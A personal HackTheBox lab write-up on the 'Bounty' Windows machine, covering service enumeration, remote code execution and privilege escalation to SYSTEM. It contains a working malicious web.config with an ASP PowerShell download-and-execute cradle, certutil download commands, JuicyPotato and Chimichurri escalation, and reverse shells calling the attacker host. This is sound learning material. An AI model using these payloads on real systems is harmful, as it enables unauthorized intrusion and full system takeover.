---
tags:
  - hack
  - windows
---
# HTB: [Bounty](https://app.hackthebox.com/machines/Bounty)

These are my notes, and not necessarily a detailed walk-through.

## Services

### TCP

```console
# Nmap 7.94SVN scan initiated Sat Aug 31 16:50:30 2024 as: nmap -v --reason -Pn -T4 --min-rate 10000 -p- --open -sCV -oN nmap_tcp-bounty.htb.txt bounty.htb
Nmap scan report for bounty.htb (10.10.10.93)
Host is up, received user-set (0.091s latency).
rDNS record for 10.10.10.93: t
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 31 16:50:55 2024 -- 1 IP address (1 host up) scanned in 25.41 seconds
```

#### 80/tcp-http

```text
__http-methods:
  Supported Methods: OPTIONS TRACE GET HEAD POST
  Potentially risky methods: TRACE
__http-server-header:
Microsoft-IIS/7.5
__http-title:
Bounty
```

```console
$ whatweb -a3 bounty.htb
http://bounty.htb [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
```

![](_/htb-bounty-20240831-1.png)

`200      GET       22l       58w      941c http://bounty.htb/transfer.aspx`

![](_/htb-bounty-20240831-2.png)

`feroxbuster` also returns this:

```text
301      GET        2l       10w      155c http://bounty.htb/uploadedFiles => http://bounty.htb/uploadedFiles/
```

But directory listing is forbidden:

```console
$ curl -I http://bounty.htb/uploadedfiles/
HTTP/1.1 403 Forbidden
```

I try using `transfer.aspx` to upload a file and then checking that filename in that directory, but it's not there.

## Remote Code Execution

Oh, apparently the uploaded file isn't there because there's a regular job that clears out that directory. If I check it immediately after uploading, the file is there!

`transfer.aspx` allows the `.config` file extension. I configure Nishang's PowerShell script in my web server and upload the following `web.config`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.21/x.ps1')")
%>
```

This works:

```powershell
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.93] 49162
whoWindows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
bounty\merlin
```

Note: the `user.txt` flag was hidden, so I needed to do `ls -force` to view it. Maybe I should just get in the habit of always using `-force`?

## Privilege Escalation

```powershell
PS C:\users\merlin\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```powershell
PS C:\windows\temp> certutil -urlcache -f http://10.10.14.21/JuicyPotato.exe /windows/temp/jp.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```console
PS C:\windows\temp> ./jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\temp\x.exe -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```console
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.93] 49176
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
nt authority\system
PS C:\Windows\system32> cd /users/administrator/desktop
PS C:\users\administrator\desktop> ls

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-ar--         9/26/2024  11:45 PM         34 root.txt

PS C:\users\administrator\desktop> cat root.txt
f56107...
```

`Chimichurri.exe` also works:

```powershell
PS C:\windows\temp> certutil -urlcache -f http://10.10.14.21/Chimichurri.exe /windows/temp/chimi.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\windows\temp> ./chimi.exe 10.10.14.21 443
```

```powershell
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.93] 49180
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\temp>whoami
whoami
nt authority\system
```

## Post-exploitation

Life after `root`.

```powershell
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          9/26/2024, 9:07:43 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,540 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,497 MB
Virtual Memory: In Use:    598 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.93
```

```powershell
PS C:\windows\system32\inetsrv>PS C:\windows\system32\inetsrv> $PSVersionTable

Name                           Value
----                           -----
CLRVersion                     2.0.50727.4927
BuildVersion                   6.1.7600.16385
PSVersion                      2.0
WSManStackVersion              2.0
PSCompatibleVersions           {1.0, 2.0}
SerializationVersion           1.1.0.1
PSRemotingProtocolVersion      2.1
```

## Open Questions

The Nishang reverse shell worked, but `ConPtyShell` and `msfvenom` payloads did not. Why?

## Credits

- <https://0xdf.gitlab.io/2018/10/27/htb-bounty.html>
- <https://medium.com/@toneemarqus/bounty-htb-manual-walkthrough-2023-oscp-journey-79214a4f78dd>
